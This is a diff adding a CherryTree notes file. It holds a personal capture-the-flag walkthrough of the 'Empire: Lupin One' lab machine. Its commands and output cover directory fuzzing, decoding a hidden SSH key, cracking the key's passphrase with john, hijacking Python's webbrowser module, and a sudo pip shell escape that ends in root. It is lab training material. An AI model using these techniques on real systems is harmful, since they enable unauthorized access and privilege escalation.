@@ -1,0 +1,183 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Lupin" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1671994253" ts_lastsave="1671994275">
+    <node name="vulnuerablilities" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1671994267" ts_lastsave="1672056780">
+      <rich_text>22/tcp open ssh 
+80/tcp 
+http-robots.txt: 1 disallowed entry 
+|_/~myfiles
+
+ffuf -c -u </rich_text>
+      <rich_text link="webs http://192.168.1.49/~FUZZ">http://192.168.1.49/~FUZZ</rich_text>
+      <rich_text> -w /usr/share/wordlists/dirb/common.txt
+ 
+ will give us secret file , browse it like http:/192.168.1.49/~secret
+ 
+ which further give this info i.e. 
+ 
+ Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create ssh private key file, 
+Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack. 
+I'm smart I know that.
+Any problem let me know
+</rich_text>
+      <rich_text scale="h4">Your best friend icex64 </rich_text>
+      <rich_text>
+
+--- from the message we go the idea that the file is hidden and contains hashed ssh private key--- 
+search again using ffuf 
+ffuf -c -ic -u </rich_text>
+      <rich_text link="webs http://192.168.1.49/~secret/.FUZZ">http://192.168.1.49/~secret/.FUZZ</rich_text>
+      <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fc 403 -e .txt,.html
+
+will give mysecret.txt -→ </rich_text>
+      <rich_text link="webs http://192.168.1.49/~secret/.mysecret.txt">http://192.168.1.49/~secret/.mysecret.txt</rich_text>
+      <rich_text> will reveal hashed private key.. 
+
+so decode it using  ‘CyberChef’ applying various hashing alogorithm.  like in this case base58 gaves us the private key.. 
+
+save it  using a text editor. 
+
+
+assuming ‘icex64’ as user and the private key retrieved lets try.. 
+
+ssh -i ssh_key.rsa icex64@192.168.1.49
+
+aah it ask for passphrase password as it was also mentioned in message from the user. 
+
+
+lets decode it using ‘john’
+1st make hash out of it &gt;&gt;&gt; ssh2john ssh_key.rsa &gt; hash
+
+2nd &gt;&gt;&gt; john --wordlist=/usr/share/wordlists/fastrack.txt hash
+
+this will reveal  as follows : 
+
+└─$ john --wordlist=/usr/share/wordlists/fasttrack.txt hash
+Created directory: /home/kala/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+P@55w0rd!        (ssh_key.rsa)     
+1g 0:00:00:01 DONE (2022-12-25 15:20) 0.7352g/s 47.05p/s 47.05c/s 47.05C/s Spring2017..password2
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+now we can login easily. 
+ 
+$ ssh -i ssh_key.rsa icex64@192.168.1.49
+Enter passphrase for key 'ssh_key.rsa': 
+Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64
+########################################
+Welcome to Empire: Lupin One
+########################################
+Last login: Thu Oct  7 05:41:43 2021 from 192.168.26.4
+
+
+let check the previlledges 
+
+icex64@LupinOne:~$ sudo -l
+Matching Defaults entries for icex64 on LupinOne:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User icex64 may run the following commands on LupinOne:
+    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
+    
+   from this we got the idea that ‘arsene’ should be the user of interest as icex64 has no sudo rights. 
+   
+   lets first explore /home/arsene/heist.py
+   
+icex64@LupinOne:~$ cat /home/arsene/heist.py
+import webbrowser
+
+print ("Its not yet ready to get in action")
+
+webbrowser.open("</rich_text>
+      <rich_text link="webs https://empirecybersecurity.co.mz">https://empirecybersecurity.co.mz</rich_text>
+      <rich_text>")
+
+Lets research on hijacking python ... 
+
+we could use webbroswer prvilledge escalation.. for that lets locate it first. 
+
+
+locate webbrowser &gt;&gt; is Empty
+
+
+Lets use linpeas.sh 
+</rich_text>
+      <rich_text weight="heavy">LinPEAS is a script that search for possible paths  to escalate privileges on Linux/Unix*/MacOS hosts. The checks are  explained on </rich_text>
+      <rich_text link="webs https://book.hacktricks.xyz/linux-hardening/privilege-escalation" weight="heavy">book.hacktricks.xyz</rich_text>
+      <rich_text>
+
+1. download the linpeash.sh  using wget </rich_text>
+      <rich_text link="webs https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh">https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</rich_text>
+      <rich_text> 
+3.  run a apache server on the same location so that we can access it from other sysem and export the utility. 
+5. python -m http.server 80
+7. python -m http.server 80
+9. chmod +x linpeas.sh
+11.  ./linpeas.sh 
+
+this will take quiet a while but will give us paths could be used to escaled the privilledges. one of them is 
+/usr/lib/python3.9/webbrowser.py
+
+lets edit this file  add 
+os.system("/bin/bash")
+
+now execute following commadn 
+sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py  &gt;&gt;&gt; we login with arsene now.. 
+
+lets check sudo prvilledges. 
+
+arsene@LupinOne:/home/icex64$ sudo -l
+Matching Defaults entries for arsene on LupinOne:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User arsene may run the following commands on LupinOne:
+    (root) NOPASSWD: /usr/bin/pip
+
+On google search found out this 
+</rich_text>
+      <rich_text link="webs https://gtfobins.github.io/gtfobins/pip/">https://gtfobins.github.io/gtfobins/pip/</rich_text>
+      <rich_text>
+
+and after applying the 
+</rich_text>
+      <rich_text link="webs https://gtfobins.github.io/gtfobins/pip/#sudo">https://gtfobins.github.io/gtfobins/pip/#sudo</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text family="monospace">TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')" &gt; $TF/setup.py
+sudo pip install $TF</rich_text>
+      <rich_text>
+
+arsene@LupinOne:/home/icex64$ cd /tmp
+arsene@LupinOne:/tmp$ TF=$(mktemp -d)
+arsene@LupinOne:/tmp$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')" &gt; $TF/setup.py
+arsene@LupinOne:/tmp$ sudo pip install $TF
+
+Processing ./tmp.nq1F6OoqJN
+# # id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+
+
+
+   
+  
+    
+    
+     
+
+
+</rich_text>
+    </node>
+    <node name="attack" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1671994275" ts_lastsave="1671994275"/>
+  </node>
+</cherrytree>
